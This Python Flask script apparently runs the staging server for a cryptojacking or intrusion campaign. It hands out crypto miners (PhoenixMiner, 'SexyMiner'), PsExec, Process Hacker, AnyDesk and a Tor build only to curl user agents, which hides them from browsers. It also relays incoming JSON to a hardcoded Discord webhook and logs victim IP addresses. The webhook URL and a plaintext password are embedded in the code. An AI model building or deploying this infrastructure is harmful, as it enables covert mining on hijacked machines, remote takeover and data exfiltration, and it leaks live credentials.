from flask import Flask, request, abort, send_file,jsonify
import requests
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import generate_password_hash, check_password_hash
app = Flask(__name__)
import json

# OPEN Port 5000 !!!




DiscordURL = 'https://canary.discord.com/api/webhooks/900769374422585404/NBk9F9AN5Kx1ODmX32rvTFRW7PnkY4u8BQ-s7qynJABP6UZ3MlmkTlbMaLWVpjMtIqsV'
basicAuth = HTTPBasicAuth()
users = {
    "Zortos": generate_password_hash("Gamernexus123"),
}


@basicAuth.verify_password
def verify_password(username, password):
    if username in users and \
            check_password_hash(users.get(username), password):
        return username
    
@app.route('/api/download/pm.exe')
def downloadPhoenixMiner():
    path = "/root/ZortosCDN/pm.exe" 
    useragent = request.headers.get('User-Agent')
    if 'curl' in useragent:
        return send_file(path, as_attachment=True)
    # For windows you need to use drive name [ex: F:/Example.pdf]
    else:
        print(useragent)
        return 'Access to that resource is forbidden.', 403

@app.route('/api/download/TorBuild.zip')
def downloadTor():
    path = "/root/ZortosCDN/TorBuild.zip"
    useragent = request.headers.get('User-Agent')
    if 'curl' in useragent:
        return send_file(path, as_attachment=True)
    # For windows you need to use drive name [ex: F:/Example.pdf]
    else:
        print(useragent)
        return 'Access to that resource is forbidden.', 403
    
    
    
@app.route('/api/download/SexyMiner.exe')
def downloadSexyMiner():
    path = "/root/ZortosCDN/SexyMiner.exe" 
    useragent = request.headers.get('User-Agent')
    if 'curl' in useragent:
        return send_file(path, as_attachment=True)
    # For windows you need to use drive name [ex: F:/Example.pdf]
    else:
        print(useragent)
        return 'Access to that resource is forbidden.', 403
    
    
@app.route('/api/download/PsExec.exe')
def downloadpsexec():
    path = "/root/ZortosCDN/PsExec.exe" # Add your own directory
    useragent = request.headers.get('User-Agent')
    if 'curl' in useragent:
        return send_file(path, as_attachment=True)
    # For windows you need to use drive name [ex: F:/Example.pdf]
    else:
        print(useragent)
        return 'Access to that resource is forbidden.', 403



@app.route('/api/download/ph64.exe')
def downloadProccessHack():
    path = "/root/ZortosCDN/ph64.exe" #Add your own directory
    useragent = request.headers.get('User-Agent')
    if 'curl' in useragent:
        return send_file(path, as_attachment=True)
    # For windows you need to use drive name [ex: F:/Example.pdf]
    else:
        print(useragent)
        return 'Access to that resource is forbidden.', 403


@app.route('/api/download/Anydesk.exe')
def downloadAnydesk():
    path = "/root/ZortosCDN/Anydesk.exe" #Add your own directory
    useragent = request.headers.get('User-Agent')
    
    if 'curl' in useragent:
        return send_file(path, as_attachment=True)
    # For windows you need to use drive name [ex: F:/Example.pdf]
    else:
        print(useragent)
        return 'Access to that resource is forbidden.', 403


@app.route('/discordwebhook', methods=['POST'])
def Discordwebhook():
    if request.method == 'POST':
        result = requests.post(DiscordURL, json=request.json)
        try:
            result.raise_for_status()
        except requests.exceptions.HTTPError as err:
            print(err)
        else:
            print("Payload delivered successfully.".format(
                result.status_code))
        return 'success', 200
    else:
        abort(400)

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.method == 'POST':
        resp = request.json
        print(resp['ip'])
        print(resp['ip'])
        return 'success', 200
    else:
        abort(400)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
